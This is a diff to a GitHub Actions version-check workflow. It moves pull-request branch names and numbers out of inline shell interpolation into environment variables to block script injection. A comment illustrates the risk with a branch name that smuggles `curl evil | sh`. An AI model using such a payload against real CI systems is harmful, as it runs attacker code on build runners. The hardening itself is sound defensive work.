@@ -3,6 +3,11 @@ name: Check versions
 # Guards the release flow so a repeat of the v0.6.0 incident (release
 # branch merged to master without the version bump, Release workflow
 # failing on shard.yml != input) is caught at PR time, not at release.
+#
+# PR-controlled values (head_ref, base_ref, PR body) are passed through
+# `env:`, never interpolated into `run:` — `${{ github.head_ref }}` is a
+# branch name, i.e. attacker-controlled text, and a branch called
+# `x"; curl evil | sh; #` would execute here.
 on: [push, pull_request]
 
 jobs:
@@ -29,8 +34,10 @@ jobs:
       # v0.6.0 merge, whose files still said 0.5.0.
       - name: release branch carries its version
         if: github.event_name == 'pull_request' && github.base_ref == 'master'
+        env:
+          HEAD_REF: ${{ github.head_ref }}
         run: |
-          head="${{ github.head_ref }}"
+          head="$HEAD_REF"
           if [[ "$head" =~ ^v([0-9]+\.[0-9]+\.[0-9]+) ]]; then
             expected="${BASH_REMATCH[1]}"
             shard="$(grep '^version:' shard.yml | awk '{print $2}')"
@@ -48,9 +55,12 @@ jobs:
         if: github.event_name == 'pull_request'
         env:
           GH_TOKEN: ${{ github.token }}
+          BASE_REF: ${{ github.base_ref }}
+          HEAD_REF: ${{ github.head_ref }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
         run: |
-          base="${{ github.base_ref }}"
-          head="${{ github.head_ref }}"
+          base="$BASE_REF"
+          head="$HEAD_REF"
           expected=""
           if [[ "$base" =~ ^v([0-9]+\.[0-9]+\.[0-9]+) ]]; then
             expected="${BASH_REMATCH[1]}"
@@ -70,5 +80,5 @@ jobs:
                 failed=1
               fi
             fi
-          done < <(gh pr view "${{ github.event.pull_request.number }}" --json commits --jq '.commits[].messageHeadline')
+          done < <(gh pr view "$PR_NUMBER" --json commits --jq '.commits[].messageHeadline')
           exit $failed
